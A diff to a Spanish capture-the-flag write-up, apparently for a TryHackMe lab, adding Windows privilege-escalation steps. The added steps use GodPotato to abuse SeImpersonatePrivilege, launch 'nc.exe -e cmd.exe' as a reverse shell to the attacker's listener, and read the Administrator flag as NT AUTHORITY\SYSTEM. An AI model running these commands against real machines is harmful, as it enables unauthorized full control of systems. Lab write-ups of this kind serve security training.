@@ -302,7 +302,7 @@ Despues de analizar toda, empezaremos por el puerto 8080
 
   - Seguimos siendo el usuario "evader" pero en este caso tenemos el privilegio "SeImpersonatePrivilege ---> Enabled"
  
-    - Buscamos informacion de como elevar privilegios, basandonos en los permisos y SO que tenemos disponibles.
+    1) Buscamos informacion de como elevar privilegios localmente, basandonos en los permisos y SO que tenemos disponibles.
    
           C:\xampp\htdocs\uploads>systeminfo
           systeminfo
@@ -316,9 +316,80 @@ Despues de analizar toda, empezaremos por el puerto 8080
       [+]Informacion metodos: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
       
       [+]Metodo que vamos a utilizar: https://github.com/BeichenDream/GodPotato/releases
+ 
+      Nota: Descargamos  GodPotato-NET4.exe
 
+    2) Subimos GodPotato-NET4.exe a la maquina windows como en procesos anteriores.
+   
+    3) Obtenemos una reverse shell como  NT AUTHORITY\SYSTEM y leemos flag de Administrator.
+   
+            C:\xampp\htdocs\uploads>GodP.exe
+            GodP.exe                                                                                           
+                FFFFF                   FFF  FFFFFFF                                                       
+               FFFFFFF                  FFF  FFFFFFFF                                                      
+              FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
+              FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
+              FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
+             FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
+             FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
+             FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
+             FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
+             FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
+              FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
+              FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
+               FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
+                FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    
+            Arguments:
+            
+                    -cmd Required:True CommandLine (default cmd /c whoami)
+            Example:
+            GodPotato -cmd "cmd /c whoami"
 
+            C:\xampp\htdocs\uploads>GodP.exe -cmd "nc.exe -e cmd.exe 10.9.92.151 2002"
+            GodP.exe -cmd "nc.exe -e cmd.exe 10.9.92.151 2002"
+            [*] CombaseModule: 0x140704155631616
+            [*] DispatchTable: 0x140704157949104
+            [*] UseProtseqFunction: 0x140704157326384
+            [*] UseProtseqFunctionParamCount: 6
+            [*] HookRPC
+            [*] Start PipeServer
+            [*] CreateNamedPipe \\.\pipe\4761990a-d5c2-4c5f-95c4-0447b99839dc\pipe\epmapper
+            [*] Trigger RPCSS
+            [*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+            [*] DCOM obj IPID: 00005c02-1788-ffff-0d5d-c51da84c130d
+            [*] DCOM obj OXID: 0x26f608f96ac5b891
+            [*] DCOM obj OID: 0x365780b39c893daf
+            [*] DCOM obj Flags: 0x281
+            [*] DCOM obj PublicRefs: 0x0
+            [*] Marshal Object bytes len: 100
+            [*] UnMarshal Object
+            [*] Pipe Connected!
+            [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+            [*] CurrentsImpersonationLevel: Impersonation
+            [*] Start Search System Token
+            [*] PID : 536 Token:0x608  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+            [*] Find System Token : True
+            [*] UnmarshalObject: 0x80070776
+            [*] CurrentUser: NT AUTHORITY\SYSTEM
+            [*] process start with pid 5112
+
+               
+       - Obtenemos Shell como NT AUTHORITY\SYSTEM
+
+              ──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
+              └─# rlwrap nc -lnvp 2002
+              listening on [any] 2002 ...
+              connect to [10.9.92.151] from (UNKNOWN) [10.10.74.249] 50141
+              Microsoft Windows [Version 10.0.17763.1821]
+              (c) 2018 Microsoft Corporation. All rights reserved.
+              
+              C:\Windows\system32>
+         
+      - Leemos Administrator Flag 
       
+            C:\Users\Administrator\Desktop>type flag.txt
+            type flag.txt
+            THM{10------ADMIN_ACCESS}
 
     
 
